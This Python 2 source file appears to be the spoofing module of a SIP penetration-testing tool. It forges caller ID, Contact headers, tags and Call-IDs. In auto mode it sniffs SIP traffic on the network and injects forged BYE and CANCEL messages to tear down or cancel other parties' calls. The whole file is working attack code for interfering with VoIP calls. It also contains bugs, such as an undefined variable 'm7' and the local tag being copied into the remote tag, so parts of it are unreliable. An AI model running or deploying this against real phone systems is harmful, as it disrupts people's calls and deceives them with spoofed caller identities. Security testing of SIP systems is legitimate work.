# Spoofing App

import sys, os, socket, multitask, random, ctypes
from sipot import App, User, logger, bcolors
from hashlib import md5
from base64 import urlsafe_b64encode
# scapy
sys.path.append(''.join([os.getcwd(), '/lib/scapy']))
from scapy.all import *

# 39peers
sys.path.append(''.join([os.getcwd(), '/lib/39peers/std']))
import rfc3261, rfc2396, kutil
# Others: [multitask, helper_functions]
sys.path.append(''.join([os.getcwd(), '/lib/']))

class spooferUser(User):
	'''The User object provides a layer between the application and the SIP stack.'''
	SPOOFING = 'User Spoofing'
	def __init__(self, app):
		User.__init__(self,app)
        #Spoofer options
		self.spoof_mode = app.options.spoof_mode
		self.spoof_name = app.options.spoof_name
		self.spoof_msg_file = app.options.spoof_msg_file
		self.spoof_contact = app.options.spoof_contact
		self.spoof_local_tag = app.options.spoof_local_tag
		self.spoof_remote_tag = app.options.spoof_remote_tag
		self.spoof_callID = app.options.spoof_callID
		self.spoof_auto = app.options.spoof_auto
        #Spoofer sets
		self._spooferGen = None
		self._snifferGen = None
        #Listener
		self.listenerOff = True if self.spoof_mode in ['spfINVITE','spfBYE','spfCANCEL'] else False
		self.spoof_method = {'spfINVITE':'INVITE','spfBYE':'BYE','spfCANCEL':'CANCEL'}[app.options.spoof_mode]
	
	def stop(self):
		if self._listenerGen:
			self._listenerGen.close()
		if self._registerGen:
			self._registerGen.close()
		if self._spooferGen:
			self._spooferGen.close()
		self._registerGen = None
		return self
		
	def add_spooferGen(self):
		self.state = self.SPOOFING
		if not self._spooferGen:
			if self.spoof_auto:
				self._spooferGen  = self._auto_spoofing()
				multitask.add(self._spooferGen)
			else:
				self._spooferGen  = self._spoofing()
				multitask.add(self._spooferGen)
		return self
		
	def add_sniffer(self):
		if not self._snifferGen:
			self._snifferGen  = self._sniffer(prn=self._auto_SIPrecvd, filter="ip and port 5060", store=0)
			multitask.add(self._snifferGen)
		return self
	
	# Spoof msg content ---------
	def spoofMsg(self,message,dest=None):
		def _createBYE(message,dest):
			def BYEheaders(message):
				'''Read-only list of transaction Header objects (To, From, CSeq, Call-ID)'''
				return map(lambda x: message[x], ['To', 'From', 'Call-ID'])
			m = rfc3261.Message.createRequest('BYE', str(self.remoteParty), BYEheaders(message))
			if dest==1:
				m['CSeq'] = rfc3261.Header('2 BYE', 'CSeq')
			else:
				m['CSeq'] = rfc3261.Header(str(message.CSeq.number+1) + ' BYE', 'CSeq')
			return m
		def _createCANCEL(message):
			def CANCELheaders(message):
				'''Read-only list of transaction Header objects (To, From, CSeq, Call-ID)'''
				return map(lambda x: message[x], ['To', 'From', 'CSeq', 'Call-ID'])
			m = rfc3261.Message.createRequest('CANCEL', str(self.remoteParty), CANCELheaders(message))
			if message and message.Route: m.Route = message.Route
			if message: m.Via = message.first('Via') # only top Via included
			return m
		# Auto Spoofs -----------
		if self.spoof_auto:
			if self.spoof_mode == 'spfBYE':
				if dest==1:
					from_Header = message.From
					to_Header =  message.To
					message['Via'] = rfc3261.Header('SIP/2.0/UDP '+str(message.To.value.uri.host)+(':'+str(message.To.value.uri.port) if (m7.To.value.uri.port) else '')+';branch='+('z9hG4bK' + str(urlsafe_b64encode(md5('All That is Gold Does Not Glitter').digest())).replace('=','.'))+';rport', 'Via')
					message['To'] = rfc3261.Header(str(from_Header), 'To')
					message['From'] = rfc3261.Header(str(to_Header), 'From')
				self.remoteParty = rfc3261.Address(str(message.To.value.uri))
				self.remoteParty.uri.port = self.app.options.port
				message = _createBYE(message,dest)
			if self.spoof_mode == 'spfCANCEL':
				self.remoteParty = rfc3261.Address(str(message.To.value.uri))
				self.remoteParty.uri.port = self.app.options.port
				message = _createCANCEL(message)
		# Manual Spoofs ---------
		else:
			# Spoofs ---------
			if self.spoof_mode == 'spfINVITE':
				self.spoof_name = 'SIPOT Caller ID'
			if self.spoof_mode == 'spfBYE' and message.method != 'BYE':
				message = _createBYE(message)
			if self.spoof_mode == 'spfCANCEL' and message.method != 'CANCEL':
				message = _createCANCEL(message)
			# caller ID
			if self.spoof_name:
				message.From.value.displayName = self.spoof_name
			if self.spoof_contact:
				message.Contact = rfc3261.Header(str(self.spoof_contact), 'Contact')
			# rTag, lTag, callID
			if self.spoof_local_tag:
				message.From.tag = self.spoof_local_tag
			if self.spoof_remote_tag:
				message.To.tag = self.spoof_local_tag
			if self.spoof_callID:
				message['Call-ID'] = rfc3261.Header(self.spoof_callID, 'Call-ID')
		return message

	def _auto_SIPrecvd(self,pkt):
		try: 
			pkt = pkt[Raw].load
		except IndexError: pass
		m = rfc3261.Message()
		try:
			m = rfc3261.Message(str(pkt))
			#SIP message received -> AutoSpoof
			if self.spoof_mode == 'spfBYE':
				if (str(m.response) == "200") and (m.Cseq.method == "INVITE"):
					# To host 0
					spoof_message = self.spoofMsg(m)
					print "-------Sending BYE to: "+str(self.remoteParty.uri.hostPort)+"-------"
					print spoof_message
					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
					# To host 1
					spoof_message = self.spoofMsg(m,1)
					print "-------Sending BYE to: "+str(self.remoteParty.uri.hostPort)+"-------"
					print spoof_message
					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
			if self.spoof_mode == 'spfCANCEL':
				if (str(m.response) == "180"):
					spoof_message = self.spoofMsg(m)
					print "-------Sending CANCEL to: "+str(self.remoteParty.uri.hostPort)+"-------"
					print spoof_message
					self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
		except ValueError, E: pass # TODO: send 400 response to non-ACK request
	def _auto_spoofing(self):
		try:
			is_admin = os.getuid() == 0
		except AttributeError:
			is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin:
			# Stop listener if not necessary in spoof mode
			if self.listenerOff: self._listenerGen.close()
			self.sock.close()
			self.add_sniffer()
		else:
			print (bcolors.FAIL+"\n***** Admin rights needed to sniff the network *****\n"+bcolors.ENDC)
			self.app.stop()
			yield
			raise StopIteration()

	# Modified scapy sniff function ---------
	@conf.commands.register
	def _sniffer(self,count=0, store=1, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None,
			  opened_socket=None, stop_filter=None, *arg, **karg):
		c = 0
		if opened_socket is not None:
			s = opened_socket
		else:
			if offline is None:
				if L2socket is None:
					L2socket = conf.L2listen
				s = L2socket(type=ETH_P_ALL, *arg, **karg)
			else:
				s = PcapReader(offline)

		lst = []
		if timeout is not None:
			stoptime = time.time()+timeout
		remain = None
		while 1:
			try:
				if timeout is not None:
					remain = stoptime-time.time()
					if remain <= 0:
						break
				sel = select([s],[],[],remain)
				if s in sel[0]:
					p = s.recv(MTU)
					if p is None:
						break
					if lfilter and not lfilter(p):
						continue
					if store:
						lst.append(p)
					c += 1
					if prn:
						r = prn(p)
						if r is not None:
							print r
					if stop_filter and stop_filter(p):
						break
					if count > 0 and c >= count:
						break
			except KeyboardInterrupt:
				break
			yield
		if opened_socket is None:
			s.close()
		yield plist.PacketList(lst,"Sniffed")

	def _spoofing(self):
		# Msg to spoof generator ---------
		def _createSpoofMessage():
			if self.spoof_msg_file:
				with open (self.spoof_msg_file, "r") as file_txt:
					file_txt=file_txt.read()
				m = rfc3261.Message()
				try:
					m = m._parse(file_txt.rstrip()+'\r\n\r\n\r\n')
				except ValueError, E: pass # TODO: send 400 response to non-ACK request
			else:
				m = self._ua.createRequest(self.spoof_method)
				m.Contact = rfc3261.Header(str(self._stack.uri), 'Contact')
				m.Contact.value.uri.user = self.localParty.uri.user
				m.Expires = rfc3261.Header(str(self.app.options.register_interval), 'Expires')
			return m
		# Stop listener if not necessary in spoof mode
		if self.listenerOff: self._listenerGen.close()
		try:
			spoof_message = self.spoofMsg(_createSpoofMessage())
			if not self.listenerOff:
				self._ua.sendRequest(spoof_message)
				while True:
					response = (yield self._ua.queue.get())
					if response.CSeq.method == 'REGISTER':
						if response.is2xx:   # success
							if self.reg_refresh:
								if response.Expires: self.register_interval = int(response.Expires.value)
								if self.register_interval > 0:								
									self._ua.gen = self._register() # generator for refresh
									multitask.add(self._ua.gen)
							raise StopIteration(('success', None))
						elif response.isfinal: # failed
							raise StopIteration(('failed', str(response.response) + ' ' + response.responsetext))
			else:
				self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)				
			yield multitask.sleep(1)
			self.app.stop()
			yield
			raise StopIteration()
		except GeneratorExit:
			raise StopIteration(('failed', 'Generator closed'))
		self.app.stop()
		yield
		raise StopIteration()

	# rfc3261.Transport related methods
	def send(self, data, addr, stack):
		'''Send data to the remote addr.'''
		def _send(self, data, addr): # generator version
			# Reconfig socket needed because of scapy -------------------
			sock = socket.socket(type=socket.SOCK_DGRAM if self.app.options.transport == self.UDP else socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.bind((self.app.options.int_ip, (self.app.options.port+1) if self.app.options.transport == self.TLS else self.app.options.port))
			self.sock, self.sockaddr, self.nat = sock, kutil.getlocaladdr(sock), self.app.options.fix_nat
			#------------------------------------------------------------
			try:
				logger.debug('sending[%d] to %s\n%s'%(len(data), addr, data))
				if self.sock:
					if self.sock.type == socket.SOCK_STREAM:
						try: 
							remote = self.sock.getpeername()
							if remote != addr:
								logger.debug('connected to wrong addr', remote, 'but sending to', addr)
						except socket.error: # not connected, try connecting
							try:
								self.sock.connect(addr)
							except socket.error:
								logger.debug('failed to connect to', addr)
						try:
							yield self.sock.send(data)
						except socket.error:
							logger.debug('socket error in send')
					elif self.sock.type == socket.SOCK_DGRAM:
						try:
							yield self.sock.sendto(data, addr)
						except socket.error:
							logger.debug('socket error in sendto' )
					else:
						logger.debug('invalid socket type', self.sock.type)
			except AttributeError: pass
		multitask.add(_send(self, data, addr))

class SpoofingApp(App):
	def __init__(self, options):
		App.__init__(self,options)
		logger.info("ntsga: init spoofing app")
		
	def start(self):
		self.createUser()
		self.user = self.user.add_listenerGen()
		if self.options.register: self.user.add_registerGen()
		# RUN MULTITASK: multitask.run()
		self.RUNNING
		TaskManager = multitask.get_default_task_manager()
		while self.RUNNING and (TaskManager.has_runnable() or TaskManager.has_io_waits() or TaskManager.has_timeouts()):
			TaskManager.run_next()
		return self
		
	def createUser(self):
		self.user = spooferUser(self).createClient()
		return self
		
	def mainController(self):
		logger.info("ntsga: start spoofing controller")
		while True:
			if self.status: # Print app status
				print self.status.pop(0)
			# If not register needed or already registered => fuzz
			if not self.options.register or (self.options.register and self.user.reg_state==self.user.REGISTERED):
				while True:
					self.user.add_spooferGen()
					if not self.user.state == self.user.SPOOFING:
						self.stop()
						raise StopIteration()
					yield
				yield
			# If register needed and could not register = > stop app
			elif not (self.user.reg_result=='success' or self.user.reg_result==None):
				print 'Could not register user.'
				self.stop()
				raise StopIteration()
			yield
